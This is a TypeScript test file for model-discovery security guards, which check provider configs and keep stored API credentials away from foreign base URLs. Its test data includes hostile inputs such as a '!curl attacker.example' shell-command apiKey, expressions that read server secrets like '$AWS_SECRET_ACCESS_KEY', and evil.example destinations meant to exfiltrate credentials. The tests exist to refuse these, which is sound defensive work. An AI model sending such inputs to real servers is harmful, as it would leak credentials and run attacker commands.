import "#test-env";
import assert from "node:assert/strict";
import test from "node:test";
import { createJiti } from "jiti";

const {
  getConfiguredProviderBaseUrl,
  getConfiguredProviderCredentials,
  isConfigExpression,
  normalizeBaseUrlForCompare,
  resolveModelDiscoveryCredentialDecision,
  validateModelDiscoveryModel,
  validateModelDiscoveryProvider,
  verifyConfigExpressionsAreConfigured,
} = await createJiti(import.meta.url, { interopDefault: true }).import("./model-discovery-guards.ts");

test("validateModelDiscoveryProvider accepts the panel's draft shape", () => {
  const validated = validateModelDiscoveryProvider({
    providerName: "  acme ",
    provider: {
      baseUrl: "https://acme.example/v1",
      api: "openai-completions",
      apiKey: "sk-test",
      headers: { "x-custom": "yes" },
      compat: { reasoning: true },
      modelOverrides: {},
      models: undefined,
    },
  });
  assert.equal(validated.ok, true);
  assert.equal(validated.providerName, "acme");
  assert.equal(validated.provider.baseUrl, "https://acme.example/v1");
  assert.equal(validated.provider.apiKey, "sk-test");
  assert.deepEqual(validated.provider.extra, { compat: { reasoning: true }, modelOverrides: {} });
});

test("an omitted api stays unresolved so the catalog can supply the protocol (review blocker 3)", () => {
  const validated = validateModelDiscoveryProvider({
    providerName: "acme",
    provider: { baseUrl: "https://acme.example/v1" },
  });
  assert.equal(validated.ok, true);
  // "" sentinel: the route treats a falsy api as "fall back to pi's provider
  // catalog". Defaulting to "openai-completions" here would pin the OpenAI
  // protocol over a non-OpenAI catalog entry whose request omitted it.
  assert.equal(validated.provider.api, "");
  // An explicitly empty string is still refused at the schema layer, same as
  // the baseUrl sentinel.
  assert.equal(
    validateModelDiscoveryProvider({ providerName: "acme", provider: { api: "" } }).ok,
    false,
  );
});

test("validateModelDiscoveryProvider accepts the SDK-supported provider fields (review r1: name/authHeader/oauth are legitimate)", () => {
  const validated = validateModelDiscoveryProvider({
    providerName: "acme",
    provider: {
      baseUrl: "https://acme.example/v1",
      name: "Acme",
      authHeader: true,
      oauth: "radius",
    },
  });
  assert.equal(validated.ok, true);
  assert.deepEqual(validated.provider.extra, { name: "Acme", authHeader: true, oauth: "radius" });

  // A configured provider carrying its models list passes validation too.
  const withModels = validateModelDiscoveryProvider({
    providerName: "acme",
    provider: {
      baseUrl: "https://acme.example/v1",
      models: [{ id: "m1", headers: { "x-ok": "literal" } }],
    },
  });
  assert.equal(withModels.ok, true);
  assert.deepEqual(withModels.provider.extra.models, [{ id: "m1", headers: { "x-ok": "literal" } }]);
});

test("validateModelDiscoveryProvider refuses malformed bodies with the typed code", () => {
  for (const body of [
    null,
    "string",
    {},
    { providerName: " " },
    { providerName: "acme" },
    { providerName: "acme", provider: [] },
    { providerName: "acme", provider: { baseUrl: "" } },
    { providerName: "acme", provider: { baseUrl: "https://x", apiKey: { command: ["steal"] } } },
    { providerName: "acme", provider: { baseUrl: "https://x", unknownKey: 1 } },
    { providerName: "acme", provider: { baseUrl: "https://x", headers: { "x": 1 } } },
    { providerName: "acme", provider: { baseUrl: "https://x", compat: "nope" } },
  ]) {
    assert.deepEqual(validateModelDiscoveryProvider(body), { ok: false, reason: "invalidBody" }, JSON.stringify(body));
  }
});

test("a request-supplied apiKey may go to any base URL the request names", () => {
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://evil.example/v1",
    requestApiKey: "client-own-key",
    configuredBaseUrl: null,
  }), { attach: true, source: "requestApiKey" });
});

test("model- and modelOverrides-level headers must be literals — SDK expression syntax is refused (review r1)", () => {
  // The SDK's resolve-config-value would evaluate these against the SERVER's
  // environment, or run the leading-! form as a shell command. Provider-level
  // apiKey/headers moved to the authenticity check below (review r2) because
  // ModelsConfig.tsx legitimately round-trips a saved provider's own
  // expression-syntax apiKey on every unmodified "test" click.
  assert.equal(validateModelDiscoveryProvider({
    providerName: "acme",
    provider: { baseUrl: "https://x", modelOverrides: { m: { headers: { "x-probe": "!env" } } } },
  }).reason, "invalidConfigExpression");
  assert.equal(validateModelDiscoveryProvider({
    providerName: "acme",
    provider: { baseUrl: "https://x", models: [{ id: "m", headers: { "x-probe": "${SECRET}" } }] },
  }).reason, "invalidConfigExpression");
  assert.equal(validateModelDiscoveryModel({ id: "m", headers: { "x-probe": "$SECRET" } }).reason, "invalidConfigExpression");

  // Provider-level apiKey/headers are now structurally ACCEPTED (syntax
  // alone is no longer refused at this layer) — see the authenticity tests
  // below for the actual review r2 policy.
  assert.equal(validateModelDiscoveryProvider({
    providerName: "acme",
    provider: { baseUrl: "https://x", apiKey: "$OPENAI_API_KEY" },
  }).ok, true);
  assert.equal(validateModelDiscoveryProvider({
    providerName: "acme",
    provider: { baseUrl: "https://x", headers: { "x-probe": "$PI_WEB_PASSWORD" } },
  }).ok, true);

  // Literals pass, and the same strings are detectable directly.
  assert.equal(isConfigExpression("sk-plain-literal-123"), false);
  assert.equal(isConfigExpression("$VAR"), true);
  assert.equal(isConfigExpression("!command"), true);
  assert.equal(validateModelDiscoveryProvider({
    providerName: "acme",
    provider: { baseUrl: "https://x", apiKey: "sk-literal", headers: { "x-a": "literal $ 1" } },
  }).ok, true);
});

test("the model protocol is surfaced for provider transport selection", () => {
  const validated = validateModelDiscoveryModel({ id: "m", api: " anthropic-messages " });
  assert.equal(validated.ok, true);
  assert.equal(validated.model.api, "anthropic-messages");
  assert.equal(validated.model.api, validated.model.entry.api);

  const omitted = validateModelDiscoveryModel({ id: "m" });
  assert.equal(omitted.ok, true);
  assert.equal(Object.hasOwn(omitted.model, "api"), false);
  assert.equal(Object.hasOwn(omitted.model.entry, "api"), false);
});

test("the model entry is schema-validated and its baseUrl override is surfaced (review r1)", () => {
  const validated = validateModelDiscoveryModel({ id: " m ", baseUrl: "https://model.example/v1", headers: { "x-a": "v" } });
  assert.equal(validated.ok, true);
  assert.equal(validated.model.id, "m");
  assert.equal(validated.model.baseUrl, "https://model.example/v1");
  assert.equal(validated.model.entry.id, "m");

  for (const model of [
    null,
    {},
    { id: "" },
    { id: "m", unknownKey: 1 },
    { id: "m", reasoning: "yes" },
    { id: "m", contextWindow: "big" },
    { id: "m", input: ["video"] },
    { id: "m", headers: { "x-a": 1 } },
    { id: "m", thinkingLevelMap: "nope" },
  ]) {
    assert.equal(validateModelDiscoveryModel(model).reason, "invalidBody", JSON.stringify(model));
  }
});

test("a stored credential is attached only to the provider's configured base URL", () => {
  const configured = "https://acme.example/v1/";
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://acme.example/v1",
    configuredBaseUrl: configured,
  }), { attach: true, source: "configuredBaseUrl" });
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://evil.example/v1",
    configuredBaseUrl: configured,
  }), { attach: false, reason: "storedCredentialBaseUrlMismatch" });
});

test("a model-level baseUrl override is the effective destination the stored-credential gate checks (review r1)", () => {
  // The SDK's modelFromJson gives definition.baseUrl precedence over the
  // provider's, so a correct provider URL must not smuggle a stored
  // credential to a foreign model URL.
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://acme.example/v1",
    modelBaseUrl: "https://evil.example/v1",
    configuredBaseUrl: "https://acme.example/v1",
  }), { attach: false, reason: "storedCredentialBaseUrlMismatch" });
  // A request-supplied key still goes wherever the request says.
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://acme.example/v1",
    modelBaseUrl: "https://evil.example/v1",
    requestApiKey: "own-key",
    configuredBaseUrl: "https://acme.example/v1",
  }), { attach: true, source: "requestApiKey" });
});

test("a provider absent from models.json has no configured URL, so stored credentials never attach", () => {
  // This is the exfil shape from the audit: the request names a built-in
  // provider id ("openai") so the temp runtime inherits the stored key.
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://evil.example/v1",
    configuredBaseUrl: getConfiguredProviderBaseUrl("openai", { providers: {} }),
  }), { attach: false, reason: "storedCredentialBaseUrlMismatch" });
});

test("getConfiguredProviderBaseUrl reads the real models.json entry", () => {
  const modelsConfig = {
    providers: {
      acme: { baseUrl: "https://acme.example/v1", apiKey: "k" },
      noBaseUrl: { apiKey: "k" },
      notARecord: "nope",
    },
  };
  assert.equal(getConfiguredProviderBaseUrl("acme", modelsConfig), "https://acme.example/v1");
  assert.equal(getConfiguredProviderBaseUrl("noBaseUrl", modelsConfig), null);
  assert.equal(getConfiguredProviderBaseUrl("notARecord", modelsConfig), null);
  assert.equal(getConfiguredProviderBaseUrl("missing", modelsConfig), null);
  assert.equal(getConfiguredProviderBaseUrl("acme", {}), null);
});

test("base URL comparison ignores trailing slashes only", () => {
  assert.equal(normalizeBaseUrlForCompare("https://x.example/v1/"), "https://x.example/v1");
  assert.equal(normalizeBaseUrlForCompare(" https://x.example/v1//"), "https://x.example/v1");
});

test("getConfiguredProviderCredentials reads the real persisted apiKey/headers", () => {
  const modelsConfig = {
    providers: {
      acme: { baseUrl: "https://acme.example/v1", apiKey: "$ACME_KEY", headers: { "x-a": "$ACME_HDR", "x-b": 1 } },
      noCreds: { baseUrl: "https://x" },
      notARecord: "nope",
    },
  };
  assert.deepEqual(getConfiguredProviderCredentials("acme", modelsConfig), {
    apiKey: "$ACME_KEY",
    headers: { "x-a": "$ACME_HDR" },
  });
  assert.deepEqual(getConfiguredProviderCredentials("noCreds", modelsConfig), { apiKey: null, headers: {} });
  assert.deepEqual(getConfiguredProviderCredentials("notARecord", modelsConfig), { apiKey: null, headers: {} });
  assert.deepEqual(getConfiguredProviderCredentials("missing", modelsConfig), { apiKey: null, headers: {} });
});

test("verifyConfigExpressionsAreConfigured: an expression apiKey/header is refused unless byte-identical to the real config (review r2)", () => {
  const configured = { apiKey: "$ACME_KEY", headers: { "x-a": "$ACME_HDR" } };

  // The exact persisted expression round-trips through unmodified (the
  // ModelsConfig.tsx "test saved provider" case this fix restores).
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ apiKey: "$ACME_KEY", headers: {} }, configured),
    { ok: true },
  );
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ headers: { "x-a": "$ACME_HDR" } }, configured),
    { ok: true },
  );

  // A forged/foreign expression is refused even though it LOOKS like the
  // same shape — an attacker can only replay, never invent, an expression.
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ apiKey: "$AWS_SECRET_ACCESS_KEY", headers: {} }, configured),
    { ok: false, reason: "invalidConfigExpression" },
  );
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ apiKey: "!curl attacker.example", headers: {} }, configured),
    { ok: false, reason: "invalidConfigExpression" },
  );
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ headers: { "x-a": "$SOME_OTHER_VAR" } }, configured),
    { ok: false, reason: "invalidConfigExpression" },
  );
  // A provider with nothing configured at all refuses every expression.
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ apiKey: "$ANYTHING", headers: {} }, { apiKey: null, headers: {} }),
    { ok: false, reason: "invalidConfigExpression" },
  );

  // A literal apiKey/header is never subject to this check at all.
  assert.deepEqual(
    verifyConfigExpressionsAreConfigured({ apiKey: "sk-literal", headers: { "x-a": "literal" } }, { apiKey: null, headers: {} }),
    { ok: true },
  );
});

test("a verified-configured expression apiKey is still gated by destination (review r2): it is never a portable requestApiKey", () => {
  // Even once verifyConfigExpressionsAreConfigured has approved it, the
  // credential decision must NOT receive it as requestApiKey — the caller
  // routes an expression apiKey through the plain configuredBaseUrl gate
  // instead, so a destination mismatch still refuses it.
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://evil.example/v1",
    configuredBaseUrl: "https://acme.example/v1",
  }), { attach: false, reason: "storedCredentialBaseUrlMismatch" });
  assert.deepEqual(resolveModelDiscoveryCredentialDecision({
    baseUrl: "https://acme.example/v1",
    configuredBaseUrl: "https://acme.example/v1",
  }), { attach: true, source: "configuredBaseUrl" });
});
